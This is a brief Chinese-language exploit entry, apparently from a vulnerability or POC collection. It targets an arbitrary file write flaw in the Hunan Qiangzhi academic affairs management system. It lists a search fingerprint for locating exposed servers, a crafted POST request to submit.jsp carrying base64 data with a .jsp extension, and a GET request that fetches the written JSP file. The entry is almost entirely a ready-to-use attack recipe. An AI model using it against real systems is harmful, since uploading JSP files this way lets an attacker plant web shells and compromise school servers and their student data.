# 湖南强智教务管理系统submit存在任意文件写入漏洞

湖南强智教务管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Logon.do?method=logon&flag=sess"`
- **请求**：`POST /;/framework/scan/jsp/submit.jsp HTTP/1.1`

**Payload**
```
picData=YWJjMTI=&picExt=.jsp
GET /images/<path>.jsp HTTP/1.1
Host:
```
- **响应特征**：200 .jsp